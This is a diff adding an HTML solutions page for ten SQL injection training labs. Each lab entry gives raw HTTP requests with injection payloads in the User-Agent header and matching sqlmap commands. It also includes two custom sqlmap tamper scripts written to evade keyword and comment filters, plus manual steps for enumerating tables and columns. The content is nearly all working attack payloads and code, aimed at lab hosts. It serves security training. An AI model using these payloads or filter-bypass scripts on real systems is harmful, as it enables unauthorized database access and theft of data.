@@ -1,0 +1,235 @@
+<!DOCTYPE html>
+<html>
+
+
+<xmp theme="cyborg">
+
+Solutions
+----
+[SQLi 1]<br>
+PoC:<br>
+```
+GET / HTTP/1.1
+Host: 1.sqli.labs
+User-Agent: ' UNION SELECT user(); -- -
+```
+SQLMap Automation:
+```
+sqlmap -u 'http://1.sqli.labs/' -p user-agent --random-agent --banner
+```
+---
+[SQLi 2]<br>
+UNION and standard payloads like 1='1 are filterer.<br>
+PoC, False Blind:</br>
+```
+GET / HTTP/1.1
+Host: 2.sqli.labs
+User-Agent: ' or 'elscustom'='elsFALSE
+```
+PoC, True Blind:<br>
+```
+GET / HTTP/1.1
+Host: 2.sqli.labs
+User-Agent: ' or 'elscustom'='elscustom
+```
+SQLMap Automation:
+```
+sqlmap -u 'http://2.sqli.labs/' -p user-agent --user-agent=elsagent --technique=B --banner
+```
+---
+[SQLi 3]<br>
+Spaces are filtered.<br>
+PoC:</br>
+```
+GET / HTTP/1.1
+Host: 3.sqli.labs
+User-Agent: '/**/UNION/**/SELECT/**/@@version;#
+```
+SQLMap Automation:
+```
+sqlmap -u 'http://3.sqli.labs/' -p user-agent --random-agent --technique=U --tamper=space2comment --suffix=';#' --union-char=els --banner
+```
+---
+[SQLi 4]<br>
+Comments non longer work.<br>
+PoC:</br>
+```
+GET / HTTP/1.1
+Host: 4.sqli.labs
+User-Agent: 'UNION(select('PoC String'));#
+```
+We cannot easily automate this task, as sqlmap should balance the parentesis.<br>
+To exploit by hand you have to first find the tables in the current database:
+```
+GET / HTTP/1.1
+Host: 4.sqli.labs
+User-Agent: 'union(SELECT(group_concat(table_name))FROM(information_schema.columns)where(table_schema=database()));#
+```
+Then you can enumarate the columns:
+```
+GET / HTTP/1.1
+Host: 4.sqli.labs
+User-Agent: 'union(SELECT(group_concat(column_name))FROM(information_schema.columns)where(table_name='secretcustomers'));#
+```
+---
+[SQLi 5]<br>
+This is similar to [SQLi 4], but the developer used doublequotes around strings.
+<br>
+PoC:</br>
+```
+GET / HTTP/1.1
+Host: 5.sqli.labs
+User-Agent: "UNION(select('PoC String'));#
+```
+To exploit by hand you have again to find the tables in the current database:
+```
+GET / HTTP/1.1
+Host: 5.sqli.labs
+User-Agent: "union(SELECT(group_concat(table_name))FROM(information_schema.columns)where(table_schema=database()));#
+```
+---
+[SQLi 6]<br>
+MySQL's reserved words have been filtered. Using RaNDom case does not help, as you can have, for example, somethin like "InfoRMaTIon_ScheMa" who will become "InfoRMaTI_ScheMa", as "on" or "ON" is a valid reserved word.<br>
+
+PoC:</br>
+```
+GET / HTTP/1.1
+Host: 6.sqli.labs
+User-Agent: ' UNiOn seLect @@versiOn;#
+```
+The only way to get around this kind of filtering during the exploitation automation phase is to use DifFeReNt CaSe for every letter<br>
+You have to write a simple tampering script:
+```
+#!/usr/bin/env python
+from lib.core.enums import PRIORITY
+
+__priority__ = PRIORITY.NORMAL
+
+def dependencies():
+    pass
+
+def tamper(payload, **kwargs):
+    """
+    Replaces each keyword a CaMeLcAsE VeRsIoN of it.
+
+    >>> tamper('INSERT')
+    'InSeRt'
+    """
+
+    retVal = str()
+
+    if payload:
+        for i in xrange(len(payload)):
+            if (i % 2 == 0):
+                # We cannot break 0x12345
+                if not ((payload[i] == 'x') and (payload[i-1] == '0')):
+                    retVal += payload[i].upper()
+                else:
+                    retVal += payload[i]
+            else:
+                retVal += payload[i].lower()
+    return retVal
+```
+SQLMap command line:
+```
+sqlmap -u 'http://6.sqli.labs/' -p user-agent --technique=U --tamper=/path/to/your/tampering/scripts/camelcase.py --prefix="nonexistent'" --suffix=';#' --union-char=els --banner
+```
+---
+[SQLi 7]<br>
+In this scenario, the case-insensitive filter cuts out all the reserved words, but the filter is not recursive.<br>
+PoC:</br>
+```
+GET / HTTP/1.1
+Host: 7.sqli.labs
+User-Agent: ' uZEROFILLnZEROFILLiZEROFILLoZEROFILLnZEROFILL ZEROFILLsZEROFILLeZEROFILLlZEROFILLeZEROFILLcZEROFILLt ZEROFILL@@ZEROFILLvZEROFILLeZEROFILLrZEROFILLsZEROFILLiZEROFILLoZEROFILLnZEROFILL; ZEROFILL-- ZEROFILL-ZEROFILL
+```
+Tampering script:
+```
+#!/usr/bin/env python
+from lib.core.enums import PRIORITY
+
+__priority__ = PRIORITY.NORMAL
+
+def dependencies():
+    pass
+
+def tamper(payload, **kwargs):
+    """
+    Insert FILL after every character
+
+    >>> tamper('INSERT')
+    'IfillNfillSfillEfillRfillTfill
+    """
+
+    retVal = str()
+
+    FILL='ZEROFILL'
+
+    if payload:
+        for i in xrange(len(payload)):
+            retVal += payload[i]+FILL
+    # Uncomment to debug
+#    print "pretamper:", payload
+    return retVal
+```
+SQLMap automation:
+```
+sqlmap -u 'http://7.sqli.labs/' -p user-agent --technique=U --tamper=/path/to/your/tampering/scripts/fill.py --banner
+```
+---
+[SQLi 8]<br>
+Simple URL encoding.<br>
+PoC:</br>
+```
+GET / HTTP/1.1
+Host: 8.sqli.labs
+User-Agent: %61%61%61%61%27%20%75%6e%69%6f%6e%20%73%65%6c%65%63%74%20%40%40%76%65%72%73%69%6f%6e%3b%20%2d%2d%20%2d
+```
+SQLMap Automation:
+```
+sqlmap -u 'http://8.sqli.labs/' -p user-agent --tamper=charencode --technique=U --banner
+```
+---
+[SQLi 9]<br>
+Double encoding.<br>
+PoC:</br>
+```
+GET / HTTP/1.1
+Host: 9.sqli.labs
+User-Agent: %25%36%31%25%36%31%25%36%31%25%36%31%25%32%37%25%32%30%25%37%35%25%36%65%25%36%39%25%36%66%25%36%65%25%32%30%25%37%33%25%36%35%25%36%63%25%36%35%25%36%33%25%37%34%25%32%30%25%34%30%25%34%30%25%37%36%25%36%35%25%37%32%25%37%33%25%36%39%25%36%66%25%36%65%25%33%62%25%32%30%25%32%64%25%32%64%25%32%30%25%32%64
+```
+SQLMap Automation:
+```
+sqlmap -u 'http://9.sqli.labs/' -p user-agent --tamper=chardoubleencode --technique=U --banner
+```
+---
+[SQLi 10]<br>
+This labs combines reserver keyword filtering with an injection in a function.<br>
+PoC:</br>
+```
+GET / HTTP/1.1
+Host: 10.sqli.labs
+User-Agent: ') uZEROFILLnZEROFILLiZEROFILLoZEROFILLn sZEROFILLeZEROFILLlZEROFILLeZEROFILLcZEROFILLt 'PoC'; -- -
+```
+SQLMap Automation:
+```
+sqlmap -u 'http://10.sqli.labs/' -p user-agent --technique=U --tamper=/path/to/your/tampering/scripts/fill.py --prefix="notexistant')" --suffix="; -- " --union-char=els --banner
+
+```
+---
+
+[SQLi 1]:http://1.sqli.labs
+[SQLi 2]:http://2.sqli.labs
+[SQLi 3]:http://3.sqli.labs
+[SQLi 4]:http://4.sqli.labs
+[SQLi 5]:http://5.sqli.labs
+[SQLi 6]:http://6.sqli.labs
+[SQLi 7]:http://7.sqli.labs
+[SQLi 8]:http://8.sqli.labs
+[SQLi 9]:http://9.sqli.labs
+[SQLi 10]:http://10.sqli.labs
+
+</xmp>
+
+<script src="strapdown.js"></script>
+</html>
